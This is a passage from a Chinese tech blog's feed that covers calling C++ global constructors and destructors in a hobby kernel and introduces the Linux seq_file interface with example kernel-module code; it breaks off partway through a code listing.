的调用</h2><p>在用户态程序中对于全局初始化器（例如全局对象的构造函数，或是 constructor attribute 修饰的函数）的调用通常在 <code>main()</code> 函数前完成（这里我们仅考虑 <code>GCC</code> 编译器），编译器会生成对应的 <strong>调用构造器与析构器的函数</strong> （通常每个文件一个，函数名中带有 <code>static_initialization_and_destruction</code> ），并将这些函数的地址单独存放到一个 <code>.init_array</code> 段，在运行 <code>main()</code> 函数前的 <code>__libc_start_main()</code> 会调用这些函数指针</p><p>因此对于我们的 kernel 环境而言，若要初始化这些全局对象， <strong>我们只需要手动调用这些函数指针即可</strong> ，这里笔者将 <code>.init_array</code> 段放在了 <code>.data</code> 段中，并使用一个外部符号标识其位置：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haskell">.<span class="hljs-class"><span class="hljs-keyword">data</span> <span class="hljs-type">ALIGN</span>(4096) : <span class="hljs-type">AT</span> (<span class="hljs-title">__kernel_text_sz</span> + <span class="hljs-title">__boot_end</span>)</span><br>&#123;<br>*(.<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br>__init_array = .;<br>*(.init_array)<br></code></pre></td></tr></table></figure><p>之后我们直接引入该符号并调用对应的函数指针即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-title">int</span> <span class="hljs-params">(*__init_array)</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-title">int</span> <span class="hljs-params">(*__init_array_end)</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br><span class="hljs-comment">/* ... */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">global_constructor_caller</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">int</span> (**init_array)(<span class="hljs-type">void</span>) = &amp;__init_array;<br>    <span class="hljs-built_in">int</span> (**init_array_end)(<span class="hljs-type">void</span>) = &amp;__init_array_end;<br>    <span class="hljs-type">int</span> error;<br><br>    <span class="hljs-keyword">for</span> (base::<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; init_array[i] &amp;&amp; ((init_array + i) &lt; init_array_end); i++) &#123;<br>        error = init_array[i]();<br>        <span class="hljs-keyword">if</span> (error) &#123;<br>            <span class="hljs-keyword">return</span> error;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="global-destructor-的调用"><a href="#global-destructor-的调用" class="headerlink" title="global destructor 的调用"></a>global destructor 的调用</h2><p>全局析构器的实现则比构造器相对复杂一些，对每个存在全局构造器&#x2F;析构器的文件的 <code>*_static_initialization_and_destruction_*()</code> 函数，其除了调用构造器以外，还会 <strong>进行析构器信息的装填</strong> ，这通过 <code>int __cxa_atexit(void (*destructor) (void *), void *arg, void *__dso_handle)</code> 函数完成，其三个参数分别为：析构函数指针、待析构对象、一个特殊的标记值（对我们来说可以不用管）</p><p>因此我们只需要自行实现一个 <code>__cxa_at_exit</code> 函数来记录析构器信息即可，为了实现动态的析构器数据记录，我们动态分配 <code>dtor_info</code> 结构体来记录待析构对象的信息，并将其链接为单向链表：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *next;<br>    <span class="hljs-built_in">void</span> (*destructor) (<span class="hljs-type">void</span> *);<br>    <span class="hljs-type">void</span> *arg;<br>    <span class="hljs-type">void</span> *__dso_handle;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *global_dtors = <span class="hljs-literal">nullptr</span>;<br><br><span class="hljs-type">int</span> __cxa_atexit(<span class="hljs-built_in">void</span> (*destructor) (<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg, <span class="hljs-type">void</span> *__dso_handle)<br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *new_info;<br>    <br>    new_info = <span class="hljs-keyword">new</span> <span class="hljs-keyword">struct</span> dtor_info;<br>    <span class="hljs-keyword">if</span> (new_info == <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br><br>    new_info-&gt;next = global_dtors;<br>    new_info-&gt;destructor = destructor;<br>    new_info-&gt;arg = arg;<br>    new_info-&gt;__dso_handle = __dso_handle;<br><br>    global_dtors = new_info;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>此外，我们还需要定义一个 <code>__dso_handle</code> 变量，并导出到我们的 <code>cpp_base.hpp</code> 中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">void</span>* __dso_handle __attribute__((<span class="hljs-built_in">visibility</span>(<span class="hljs-string">&quot;hidden&quot;</span>)));<br></code></pre></td></tr></table></figure><p>接下来是对析构器的调用，在 C++ ABI 规范中，对这些析构器的调用应当由 <code>void __cxa_finalize ( void *__dso_handle)</code> 函数完成，其应当将析构器条目的 <code>__dso_handle</code> 与其参数进行对比，相等则调用析构器（若传参为空则应当调用所有析构器）并将对应的条目无效化，因此在我们的 ClosureOS 内核中也应当实现一个 <code>__cxa_finalize()</code> 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">lib::atomic::SpinLock dtor_exit_lock;<br><br><span class="hljs-type">void</span> __cxa_finalize(<span class="hljs-type">void</span>* dso_handle)<br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> **pdtor = &amp;global_dtors;<br><br>    dtor_exit_lock.<span class="hljs-built_in">Lock</span>();<br><br>    <span class="hljs-keyword">while</span> (*pdtor) &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *dtor = *pdtor;<br><br>        <span class="hljs-keyword">if</span> (!dso_handle || dtor-&gt;__dso_handle == dso_handle) &#123;<br>            *pdtor = dtor-&gt;next;<br>            dtor-&gt;<span class="hljs-built_in">destructor</span>(dtor-&gt;arg);<br>            <span class="hljs-keyword">delete</span> dtor;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            pdtor = &amp;dtor-&gt;next;<br>        &#125;<br>    &#125;<br><br>    dtor_exit_lock.<span class="hljs-built_in">UnLock</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是 <strong>这个函数应当在程序退出时进行手动调用</strong> ，由于我们尚未编写电源管理模块，因此本章所涉及的代码不会调用该函数</p><h2 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h2><p>虚函数是 C++ 的一个特性，简而言之其中的纯虚函数是一个类似占位符的存在，当程序调用纯虚函数时程序会报错，在内核环境中我们并没有各种库因此我们需要实现相应的 error handler</p><p>对于 GCC 而言，这个 error handler 应当为 <code>__cxa_pure_virtual()</code> 函数，因此我们只需要在我们的内核中实现该函数即可， <em>目前我们暂且留空</em> ，在后续完成内核输出功能后再添加上类似 <code>printk()</code> 的报错信息输出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">void</span> __cxa_pure_virtual()<br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">TODO:</span> add error message output</span><br><span class="hljs-comment">    */</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF. Reference"></a>0xFF. Reference</h1><p><a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">【OS.0x03】Linux内核内存管理II - Buddy System</a></p><p><a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">【OS.0x04】Linux 内核内存管理浅析 III - Slub Allocator</a></p><p><a href="https://blogs.oracle.com/linux/post/linux-slub-allocator-internals-and-debugging-1">Linux SLUB Allocator Internals and Debugging, Part 1 of 4</a></p><p><a href="https://wiki.osdev.org/C++">C++ - OS Dev</a></p><p><a href="https://wiki.osdev.org/Calling_Global_Constructors">Calling Global Constructors - OS Dev</a></p><p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html">Itanium C++ ABI</a></p><p> <a href="https://refspecs.linuxfoundation.org/elf/elf.pdf">Linux Foundation - Executable and Linking Format (ELF) Specification</a> </p><p><a href="https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf">AMD64 Architecture Programmer’s Manual Volume 2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Good old MEMORIES has gone…&lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="https://arttnba3.github.io/categories/CODE/"/>
    
    
    <category term="开发手记" scheme="https://arttnba3.github.io/tags/%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="内存管理" scheme="https://arttnba3.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="C++" scheme="https://arttnba3.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x05】Linux 内核文件系统 - 初探序列文件接口</title>
    <link href="https://arttnba3.github.io/2024/05/31/OS-0X05-LINUX-KERNEL-FILESYSTEM-SEQFILE/"/>
    <id>https://arttnba3.github.io/2024/05/31/OS-0X05-LINUX-KERNEL-FILESYSTEM-SEQFILE/</id>
    <published>2024-05-30T21:36:25.000Z</published>
    <updated>2024-08-19T06:25:57.624Z</updated>
    
    <content type="html"><![CDATA[<p>真是序序又列列啊，你们有没有这样的文件接口啊我想问</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者大二上那会学 kernel pwn 时便经常在用户态用到序列文件接口，不过在那个时候笔者只关心打开 <code>/proc/self/stat</code> 文件便能分配一个 <code>kmalloc-32</code> 对象（<code>seq_operations</code> ）；大二下写 Linux kernel rootkit 时又碰到 <code>/proc/kallsyms</code> 无法在内核层读取的问题，不过也是了解了一下序列文件接口的相关知识就没有再继续深入了（<del>不过这个东西本来就很简约，就其本身而言确实没有什么能够深入的地方</del>）</p><p>刚好笔者最近的工作又接触到了这个玩意，所以简单写一篇博客记录一下这是个什么玩意：）</p><h1 id="0x01-序列文件接口-简介"><a href="#0x01-序列文件接口-简介" class="headerlink" title="0x01. 序列文件接口 - 简介"></a>0x01. 序列文件接口 - 简介</h1><p><a href="https://docs.kernel.org/filesystems/seq_file.html">序列文件接口</a> 是在现有 VFS 上建立的一套用于 <strong>从内核空间向用户空间提供传输序列数据</strong> 的接口，这里我们将序列数据简单定义为 <strong>由多条数据组成的数据</strong> （例如 <code>/proc/kallsyms</code> 为用户提供了多条内核符号信息数据），这个场景下内核通常需要多次迭代地向用户空间拷贝多条数据</p><p>序列文件接口的设计主要出于一个原因：<strong>【大于一页的文件操作对于开发者而言非常麻烦】</strong> ，我们要从内核空间向用户空间传递数据通常需要自行创建如 <code>procfs</code> 等节点并自定义一份 <code>file_operations</code> ，开发者能用的只有一个裸的 <code>read(struct file *, char __user *, size_t, loff_t *)</code> ，而对于这类功能比较单一的场景， <em>设计上要考虑的和常规的文件接口相比却一个都不能少</em> （跨页多条数据拷贝的文件偏移处理确实不是个小问题），这增大了开发者的开发难度，但序列数据的传输在内核开发中其实又是一个非常常见的场景</p><p>由此，针对此类场景，序列文件接口应运而生，<strong>为上层开发者提供了类似【迭代器】的简易文件读取接口</strong> ，由此极大地简化了对于此类场景的内核开发工作</p><blockquote><p>本篇博客使用的内核源码为 6.9.1</p></blockquote><h2 id="序列文件接口开发：操作函数"><a href="#序列文件接口开发：操作函数" class="headerlink" title="序列文件接口开发：操作函数"></a>序列文件接口开发：操作函数</h2><p>要使用序列文件接口，我们需要实现一个 <code>seq_operations</code> 函数表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br><span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br><span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>各函数指针说明如下（<strong>按照被调用顺序</strong>）：</p><ul><li><code>start</code> ：在开始读取序列数据前进行初始化工作，并返回指定偏移上的序列数据对象</li><li><code>show</code> ：打印传入的序列数据对象，该函数会被循环调用</li><li><code>next</code> ： 根据传入的偏移值与当前对象获取下一个序列数据对象，并自增偏移值，该函数会被循环调用</li><li><code>stop</code> ：在完成对序列文件的遍历后用以进行需要的收尾工作，可以为空函数</li></ul><p>需要注意的是，这里所说的偏移值通常指的 <strong>其实是序列数据对象的索引值</strong> ，而非基于具体内存对象大小计算的值</p><p>除了 <code>seq_operations</code> 函数表以外，序列文件接口对于每个文件还会额外分配一个 <code>seq_file</code> 结构体（在 open() 时分配到 <code>file-&gt;private</code> ）用以存储如当前的读取偏移、整个序列的长度等数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">size_t</span> from;<br><span class="hljs-type">size_t</span> count;<br><span class="hljs-type">size_t</span> pad_until;<br><span class="hljs-type">loff_t</span> index;<br><span class="hljs-type">loff_t</span> read_pos;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span><br><span class="hljs-type">int</span> poll_event;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-type">void</span> *private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>核心的字段说明如下：</p><ul><li><code>buf</code> ：临时存放由 <code>show()</code> 打印的数据，通常为单张内存页大小，数据会先被拷贝到这块内存上再拷贝回用户空间</li><li><code>size</code> ：<code>buf</code> 的总大小</li><li><code>from</code>：<code>buf</code> 当前数据写入的起始偏移</li><li><code>count</code> ：<code>buf</code> 已经写入的大小，<strong>序列文件上的有效待写入数据为</strong> <code>&amp;seq_file::buf[seq_file::from]</code> <strong>起始的长度为</strong> <code>seq_file::count</code> <strong>的区域</strong> ，通常每一轮读取都会刷新一次 <code>count</code> 字段</li><li><code>index</code> ： 当前正在读取的对象的偏移值</li><li><code>read_pos</code> ：成功读取的数据量（字节）</li><li><code>op</code> ：序列文件接口的函数表 <del>其实是指玩原神的人</del> </li><li><code>file</code> ：对应的 VFS file 节点</li><li><code>private</code> ：供上层开发者存放私人数据</li></ul><p>下面我们以一个基础的链表结构作为示例说明如何基于序列文件接口进行基本的开发：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x100</span>];<br>&#125;;<br><br>LIST_HEAD(a3_seq_list);<br></code></pre></td></tr></table></figure><h3 id="start-：序列文件读取初始化"><a href="#start-：序列文件读取初始化" class="headerlink" title="start()：序列文件读取初始化"></a>start()：序列文件读取初始化</h3><p>内核将单次 <code>read()</code> 系统调用读取的过程称之为一个 <code>session</code> ，在每个 session 开始时都会调用序列文件接口的 <code>start()</code> 函数以进行初始化，核心作用是 <strong>在读取开始时获取指定偏移值上的对象作为起始点</strong> ，我们通常需要返回<strong>指定偏移上的序列数据对象</strong></p><p>在现代内核及驱动开发场景中 <code>start()</code> 所获取到的通常是第一个序列数据对象，这也是序列文件接口的规范用法， <em>因为大部分情况下开发者并不需要处理偏移值不为 0 的场景</em> ，因此也可以简单返回一个  <code>SEQ_START_TOKEN</code>  （值为 1）</p><blockquote><p>该值用于在 <code>next()</code> 与 <code>show()</code> 中<strong>供你自己进行识别</strong>，所以只要你认得就行</p></blockquote><p>对于读取到末尾的情况（偏移值超出范围）， <strong>通常直接返回 NULL 即可</strong> ，对于初始化失败的场景，我们还可以返回一个 <code>ERR_PTR</code> 类型值进行说明</p><p>以下是我们的示例代码，这里我们简单地返回链表上指定偏移的对象：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span>;</span><br>    <span class="hljs-type">loff_t</span> cpos = <span class="hljs-number">0</span>;<br><br>    list_for_each_entry(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        <span class="hljs-keyword">if</span> (cpos == (*ppos)) &#123;<br>            <span class="hljs-keyword">return</span> ptr;<br>        &#125;<br><br>        cpos++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="show-：打印指定的序列数据"><a href="#show-：打印指定的序列数据" class="headerlink" title="show()：打印指定的序列数据"></a>show()：打印指定的序列数据</h3><p><code>show()</code> 函数用于将当前序列对象需要被导出的数据通过序列文件的打印接口拷贝到指定的临时内存（即 <code>seq_file::buf</code> ）上，这些数据会在多次遍历完成后（buf 满了或者序列遍历完成）统一拷贝到用户空间，可用的接口通常有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* print data directly */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_printf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)</span>; <span class="hljs-comment">/* mostly used */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_putc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">char</span> c)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_puts</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_escape</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span>;<br><span class="hljs-comment">/* print file path */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_path</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *path,</span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_path_root</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *path,</span><br><span class="hljs-params">                  <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *root, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span><br></code></pre></td></tr></table></figure><p>正常打印完成需要返回 0，返回小于 0 的值表示出错，返回大于 0 的值（ <code>SEQ_SKIP</code> ）表示跳过该项，以下是我们的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span> =</span> v;<br><br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] data: %s\n&quot;</span>, data-&gt;data);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="next-：获取指定偏移上的序列数据，自增偏移值"><a href="#next-：获取指定偏移上的序列数据，自增偏移值" class="headerlink" title="next()：获取指定偏移上的序列数据，自增偏移值"></a>next()：获取指定偏移上的序列数据，自增偏移值</h3><p><code>next()</code> 函数用以 <strong>根据传入的偏移值获取下一个序列数据对象，并更新偏移值</strong> ，在单次 session 中会迭代地调用 <code>next()</code> 函数，直到当前数据页无法继续装载，或是已经读取完序列上所有的数据</p><p>在 <code>next()</code> 函数当中，我们需要更新上层的 index （通常直接 <code>+1</code> 即可），并返回下一个序列数据对象，以下是我们的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span> =</span> v;<br><br>    (*ppos)++;<br><br>    ptr = list_next_entry(ptr, <span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">if</span> (unlikely(list_entry_is_head(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="stop-：序列文件关闭清理"><a href="#stop-：序列文件关闭清理" class="headerlink" title="stop()：序列文件关闭清理"></a>stop()：序列文件关闭清理</h3><p><code>stop()</code> 函数用于在单个 session 结束时进行一些自定义的需要的清理工作，因此通常也可以只是一个空函数，以下是我们的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_seq_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-comment">/* do nothing */</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="序列文件接口开发：初始化"><a href="#序列文件接口开发：初始化" class="headerlink" title="序列文件接口开发：初始化"></a>序列文件接口开发：初始化</h2><p>完成了序列文件接口四个函数的定义后，接下来我们需要在创建通用 VFS 节点时进行初始化，主要就是定义四个通用函数：</p><ul><li><code>open()</code> ：该函数中我们需要调用 <code>seq_open()</code> 进行初始化，其会分配一个 <code>seq_file</code> 结构体存放到 <code>file-&gt;private</code> ，我们也可以使用 <code>__seq_open_private()</code> （等价于多一次 kmalloc() 分配自定义数据对象）</li><li>二选一：<ul><li><code>read()</code> ：该函数指针需要被初始化为 <code>seq_read()</code> ，但你也可以再套个 wrapper</li><li><code>read_iter()</code> ：该函数指针需要被初始化为 <code>seq_read_iter()</code> ，但你也可以再套个 wrapper</li></ul></li><li><code>lseek()</code> ：该函数指针需要被初始化为 <code>seq_lseek()</code> ，但你也可以再套个 wrapper</li><li><code>release()</code> ：该函数指针需要被初始化为 <code>seq_release()</code> ，但你也可以再套个 wrapper</li></ul><p>之后像往常一样初始化文件接口即可，对序列文件接口的操作都会直接通过这些 <code>seq_*</code> API 完成，这极大地简化了开发者的工作，以下是我们以 <code>procfs</code> 为例的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 